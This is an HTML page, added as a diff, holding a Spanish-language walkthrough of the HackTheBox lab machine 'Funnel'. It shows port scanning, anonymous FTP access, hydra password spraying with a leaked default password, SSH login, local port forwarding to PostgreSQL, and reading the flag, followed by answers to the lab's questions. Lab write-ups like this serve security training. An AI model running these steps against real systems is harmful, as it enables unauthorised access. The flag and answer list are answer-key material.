@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Funnel HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/funnel.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Funnel HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Funnel de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Funnel de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Funnel HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Funnel HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Funnel de la plataforma de HackTheBox","headline":"Writeup Funnel HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Funnel HackTheBox</h1>
+          <p>Resolución de la máquina Funnel de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.228.195
+Nmap scan report for 10.129.228.195
+Nmap scan report for 10.129.228.195
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh</span>
+</code></pre></div></div>
+
+<div><p>Nos podemos conectar como anonymous a ftp y vemos un directorio lllamado mail_backup</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ftp </span><span class="p">10.129.228.195
+Connected to 10.129.228.195.
+220 (vsFTPd 3.0.3)
+Name (10.129.228.195:gato): </span><span class="kd">anonymous</span><span class="p">
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="kd">ftp> </span><span class="p">ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Nov 28 14:31 </span><span class="na">mail_backup</span><span class="p">
+226 Directory send OK.
+</span><span class="kd">ftp></span>
+</code></pre></div></div>
+
+<div><p>Dentro de el vemos 2 archivos existentes asi que descargamos ambos y salimos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">ftp> </span><span class="p">cd mail_backup
+250 Directory successfully changed.
+</span><span class="kd">ftp> </span><span class="p">ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp         58899 Nov 28 14:30 password_policy.pdf
+-rw-r--r--    1 ftp      ftp           713 Nov 28 14:31 welcome_28112022
+226 Directory send OK.
+</span><span class="kd">ftp> </span><span class="p">get password_policy.pdf
+local: password_policy.pdf remote: password_policy.pdf
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
+226 Transfer complete.
+58899 bytes received in 0.21 secs (272.6062 kB/s)
+</span><span class="kd">ftp> </span><span class="p">get welcome_28112022
+local: welcome_28112022 remote: welcome_28112022
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
+226 Transfer complete.
+713 bytes received in 0.00 secs (5.2711 MB/s)
+</span><span class="kd">ftp></span><span class="p"> exit</span>
+</code></pre></div></div>
+
+<div><p>En archivo welcome es un texto donde podemos ver algunos usuarios, dice que leamos la política</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> welcome_28112022
+Frome: root@funnel.htb
+To: </span><span class="kd">optimus</span><span class="p">@funnel.htb </span><span class="kd">albert</span><span class="p">@funnel.htb </span><span class="kd">andreas</span><span class="p">@funnel.htb </span><span class="kd">christine</span><span class="p">@funnel.htb</span><span class="kd">maria</span><span class="p">@funnel.htb
+Subject:Welcome to the team!
+
+Hello everyone,
+We would like to welcome you to our team. 
+We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
+We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
+All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
+We hope that you will have an amazing time with us,
+The funnel team. </span>
+</code></pre></div></div>
+
+<div><p>El pdf nos dice que se debe cambiar la contraseña por defecto que es funnel123#!#</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Podemos aplicar fuerza bruta por ssh a los usuarios usando esa contraseña usando hydra</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ hydra</span><span class="p"> -L users.txt -p 'funnel123#!#' ssh://10.129.228.195
+[DATA] attacking ssh://10.129.228.195:22/
+[22][ssh] host: 10.129.228.195   login: </span><span class="s2">christine</span><span class="p">   password: </span><span class="s2">funnel123#!#</span><span class="p">
+1 of 1 target successfully completed, 1 valid password found</span>
+</code></pre></div></div>
+
+<div><p>christine no ha cambiado la contraseña nos podemos conectar por ssh y obtener una shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">christine@10.129.228.195
+christine@10.129.228.195's password: </span><span class="kd">funnel123#!#</span><span class="p">
+</span><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(christine) gid=1000(christine) groups=1000(christine)
+</span><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.129.228.195 172.17.0.1 dead:beef::250:56ff:feb9:26da 
+</span><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Dentro de la máquina podemos ver que el puerto 5432 esta abierto pero solo para el localhost</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$ ss -tln
+State     Recv-Q    Send-Q    Local Address:Port    Peer Address:Port   Process
+LISTEN    0         4096      127.0.0.53%lo:53      0.0.0.0:*           
+LISTEN    0         128       0.0.0.0:22            0.0.0.0:*           
+LISTEN    0         4096      </span><span class="kd">127.0.0.1:5432</span><span class="p">        0.0.0.0:*           
+LISTEN    0         4096      127.0.0.1:41263       0.0.0.0:*           
+LISTEN    0         32        *:21                  *:*                 
+LISTEN    0         128       [::]:22               [::]:*              
+</span><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>También encontramos que el servicio corriendo en el puerto 5432 del localhost es postgresql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$ ss -tl
+State      Recv-Q     Send-Q     Local Address:Port        Peer Address:Port
+LISTEN     0          4096       127.0.0.53%lo:domain      0.0.0.0:*
+LISTEN     0          128        0.0.0.0:ssh               0.0.0.0:*
+LISTEN     0          4096       </span><span class="kd">127.0.0.1:postgresql</span><span class="p">      0.0.0.0:*
+LISTEN     0          4096       127.0.0.1:41263           0.0.0.0:*
+LISTEN     0          32         *:ftp                     *:*
+LISTEN     0          128        [::]:ssh                  [::]:*
+</span><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podriamos intentar ingresar a la base de datos postgresql pero psql no existe en la máquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$ psql
+
+Command 'psql' not found, but can be installed with:
+
+apt install postgresql-client-common
+Please ask your administrator.
+
+</span><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Lo que haremos es un Local Port Forwarding para con ssh traernos el puerto 5432 al localhost</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">christine@10.129.228.195 -L 5432:127.0.0.1:5432
+christine@10.129.228.195's password: </span><span class="kd">funnel123#!#</span><span class="p">
+</span><span class="s2">christine@funnel</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora desde nuestro equipo nos podemos conectar con psql usando las credenciales de christine</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ psql</span><span class="p"> -p 5432 -h 127.0.0.1 -U christine 
+Contraseña para usuario christine: </span><span class="kd">funnel123#!#</span><span class="p">
+
+Digite «help» para obtener ayuda.
+
+</span><span class="kd">christine=#</span>
+</code></pre></div></div>
+
+<div><p>Listando las bases de datos podemos ver una bastante interesante, secrets</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">christine=#</span><span class="p"> \l
+                                 Listado de base de datos
+  Nombre   |   Dueño   | Codificación |  Collate   |   Ctype    |       Privilegios       
+-----------+-----------+--------------+------------+------------+-------------------------
+ christine | christine | UTF8         | en_US.utf8 | en_US.utf8 | 
+ postgres  | christine | UTF8         | en_US.utf8 | en_US.utf8 | 
+ </span><span class="kd">secrets</span><span class="p">   | christine | UTF8         | en_US.utf8 | en_US.utf8 | 
+ template0 | christine | UTF8         | en_US.utf8 | en_US.utf8 | =c/christine           +
+           |           |              |            |            | christine=CTc/christine
+ template1 | christine | UTF8         | en_US.utf8 | en_US.utf8 | =c/christine           +
+           |           |              |            |            | christine=CTc/christine
+(5 filas)
+
+</span><span class="kd">christine=#</span>
+</code></pre></div></div>
+
+<div><p>Nos conectamos a secrets y listamos las tablas podemos ver flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">christine=#</span><span class="p"> \c secrets
+Ahora está conectado a la base de datos «secrets» con el usuario «christine».
+
+</span><span class="kd">secrets=#</span><span class="p"> \dt
+        Listado de relaciones
+ Esquema | Nombre | Tipo  |   Dueño   
+---------+--------+-------+-----------
+ public  | flag   | tabla | christine
+(1 fila)
+
+</span><span class="kd">secrets=#</span>
+</code></pre></div></div>
+
+<div><p>Dumpeamos todo de la tabla flag y podemos ver la flag finalmente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">christine=#</span><span class="p"> \c secrets
+Ahora está conectado a la base de datos «secrets» con el usuario «christine».
+
+</span><span class="kd">secrets=#</span><span class="p"> select * from flag;
+              value               
+----------------------------------
+ cf277664b1771217d7006acdea006db1
+(1 fila)
+
+</span><span class="kd">secrets=#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>How many TCP ports are open?</strong></li>
+<ul><p></p><li>2</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of the directory that is available on the FTP server?</strong></li>
+<ul><p></p><li>mail_backup</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the default account password that every new member on the "Funnel" team should change as soon as possible?</strong></li>
+<ul><p></p><li>funnel123#!#</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which user has not changed their default password yet?</strong></li>
+<ul><p></p><li>christine</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which service is running on TCP port 5432 and listens only on localhost?</strong></li>
+<ul><p></p><li>postgresql</li></ul></blockquote><br>
+
+<blockquote><li><strong>Since you can't access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?</strong></li>
+<ul><p></p><li>Local Port Forwarding</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of the database that holds the flag?</strong></li>
+<ul><p></p><li>secrets</li></ul></blockquote><br>
+
+<blockquote><li><strong>Could you use a dynamic tunnel instead of local port forwarding? Yes or No.</strong></li>
+<ul><p></p><li>Yes</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>cf277664b1771217d7006acdea006db1</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
